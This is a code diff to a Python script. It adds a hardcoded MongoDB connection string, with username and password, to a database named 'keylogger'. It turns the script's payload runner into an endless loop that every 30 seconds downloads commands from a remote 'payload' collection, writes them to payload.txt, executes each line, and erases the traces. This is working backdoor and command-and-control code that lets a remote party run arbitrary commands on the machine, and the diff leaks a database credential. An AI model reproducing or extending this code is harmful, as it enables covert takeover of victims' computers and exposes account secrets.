@@ -3,6 +3,11 @@ import subprocess
 import webbrowser
 import time
 import pyautogui
+import pymongo
+
+client = pymongo.MongoClient("mongodb+srv://samratdey:mongoYzNqs%3DaQT1@keyspy.iarapa1.mongodb.net/")
+db = client["keylogger"]
+payload_collection = db["payload"]
 
 def execute_command(command):
     try:
@@ -51,23 +56,49 @@ def execute_command(command):
     except Exception as e:
         print("Error executing command:", e)
 
-# def execute_payload():
-#     current_directory = os.path.dirname(os.path.realpath(__file__))
-#     file_path = os.path.join(current_directory, 'payload.txt')
-#     with open(file_path, 'r') as file:
-#         for line in file:
-#             execute_command(line.strip())
+def store_payload():
+    # Retrieve the document from MongoDB
+    document = payload_collection.find_one()
+
+    if document:
+        # Check if the document contains the expected key
+        if "text" in document:
+            # Get the text content from the document
+            text_content = document["text"]
+
+            # Delete existing "payload.txt" file if present
+            if os.path.exists("payload.txt"):
+                os.remove("payload.txt")
+
+            # Save the text content to "payload.txt" file
+            with open("payload.txt", "w") as file:
+                file.write(text_content)
+
+            print("Text content retrieved from MongoDB and stored in payload.txt.")
+            # Delete the document from the collection
+            payload_collection.delete_one({"_id": document["_id"]})
+        else:
+            print("Document does not contain the '\"text\"' key.")
+    else:
+        print("No document found in MongoDB.")
+
 
 def execute_payload():
-    current_directory = os.path.dirname(os.path.realpath(__file__))
-    file_path = os.path.join(current_directory, 'payload.txt')
-    if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
-        with open(file_path, 'r') as file:
-            for line in file:
-                execute_command(line.strip())
-    else:
-        print("Payload file is empty or does not exist.")
+    while True:
+        store_payload()
+        time.sleep(30)  # Check every 30 seconds for new payload
+
+        current_directory = os.path.dirname(os.path.realpath(__file__))
+        file_path = os.path.join(current_directory, 'payload.txt')
+        if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
+            print("Executing payload...")
+            with open(file_path, 'r') as file:
+                for line in file:
+                    execute_command(line.strip())
+            # Delete the payload.txt file after executing the payload
+            os.remove(file_path)
+        else:
+            print("Payload file is empty or does not exist.")
 
 if __name__ == "__main__":
     execute_payload()
-
